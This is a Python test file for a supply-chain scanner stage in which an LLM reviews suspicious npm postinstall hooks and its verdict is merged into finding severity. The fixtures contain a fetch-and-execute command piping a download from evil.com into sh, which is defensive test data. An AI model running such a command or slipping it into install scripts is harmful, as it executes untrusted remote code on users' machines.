"""Tests for LLM install-hook review stage."""

from __future__ import annotations

from pathlib import Path


from packages.sca.llm.install_hook_review import (
    _merge_verdict,
    review_install_hooks,
)
from packages.sca.llm.schemas import InstallHookVerdict
from packages.sca.models import Confidence, Dependency, PinStyle, SupplyChainFinding


def _make_dep(name: str = "evil-pkg", ecosystem: str = "npm") -> Dependency:
    return Dependency(
        ecosystem=ecosystem,
        name=name,
        version="1.0.0",
        declared_in=Path("/fake/package.json"),
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=True,
        purl=f"pkg:{ecosystem.lower()}/{name}@1.0.0",
        parser_confidence=Confidence(level="high"),
    )


def _make_finding(
    *,
    script_body: str = "curl https://evil.com/payload | sh",
    severity: str = "high",
) -> SupplyChainFinding:
    return SupplyChainFinding(
        finding_id="SC-TEST-001",
        kind="install_hook_suspicious",
        dependency=_make_dep(),
        detail="Suspicious install script detected",
        evidence={
            "script_body": script_body,
            "script_key": "postinstall",
            "reasons": ["curl_sh_pipe"],
        },
        severity=severity,
        confidence=Confidence(level="medium", reason="regex match"),
    )


class TestMergeVerdict:
    def test_malicious_verdict_escalates_to_critical(self):
        finding = _make_finding(severity="high")
        verdict = InstallHookVerdict(
            verdict="malicious",
            confidence="high",
            behaviours=["outbound_network", "exec_decoded_payload"],
            evidence_quotes=["curl evil.com | sh"],
            reasoning="Downloads and executes remote code",
        )
        _merge_verdict(finding, verdict)

        assert finding.severity == "critical"
        assert finding.evidence["llm_verdict"] == "malicious"
        assert finding.evidence["llm_confidence"] == "high"
        assert "outbound_network" in finding.evidence["llm_behaviours"]

    def test_suspicious_verdict_escalates_low_to_medium(self):
        finding = _make_finding(severity="low")
        verdict = InstallHookVerdict(
            verdict="suspicious",
            confidence="medium",
            behaviours=["obfuscation"],
        )
        _merge_verdict(finding, verdict)
        assert finding.severity == "medium"

    def test_suspicious_verdict_does_not_downgrade_high(self):
        finding = _make_finding(severity="high")
        verdict = InstallHookVerdict(
            verdict="suspicious",
            confidence="medium",
        )
        _merge_verdict(finding, verdict)
        assert finding.severity == "high"

    def test_benign_verdict_does_not_change_severity(self):
        """Mechanical override: LLM 'benign' cannot suppress a mechanical finding."""
        finding = _make_finding(severity="high")
        verdict = InstallHookVerdict(
            verdict="benign",
            confidence="high",
            reasoning="Looks like a normal build script",
        )
        _merge_verdict(finding, verdict)

        assert finding.severity == "high"
        assert finding.evidence["llm_verdict"] == "benign"

    def test_behaviours_appended_with_llm_prefix(self):
        finding = _make_finding()
        verdict = InstallHookVerdict(
            verdict="suspicious",
            confidence="medium",
            behaviours=["credential_read", "process_backgrounding"],
        )
        _merge_verdict(finding, verdict)

        reasons = finding.evidence["reasons"]
        assert "llm:credential_read" in reasons
        assert "llm:process_backgrounding" in reasons
        assert "curl_sh_pipe" in reasons


class TestReviewInstallHooks:
    def test_skips_non_install_hook_findings(self):
        """Only install_hook_suspicious findings are reviewed."""
        finding = SupplyChainFinding(
            finding_id="SC-TYPO-001",
            kind="typosquat_candidate",
            dependency=_make_dep(),
            detail="Possible typosquat",
            evidence={"distance": 1},
            severity="medium",
            confidence=Confidence(level="medium"),
        )
        result = review_install_hooks(object(), [finding])
        assert len(result) == 1
        assert "llm_verdict" not in finding.evidence

    def test_skips_findings_without_script_body(self):
        finding = SupplyChainFinding(
            finding_id="SC-HOOK-001",
            kind="install_hook_suspicious",
            dependency=_make_dep(),
            detail="Install hook found",
            evidence={"script_key": "postinstall"},
            severity="medium",
            confidence=Confidence(level="medium"),
        )
        review_install_hooks(object(), [finding])
        assert "llm_verdict" not in finding.evidence
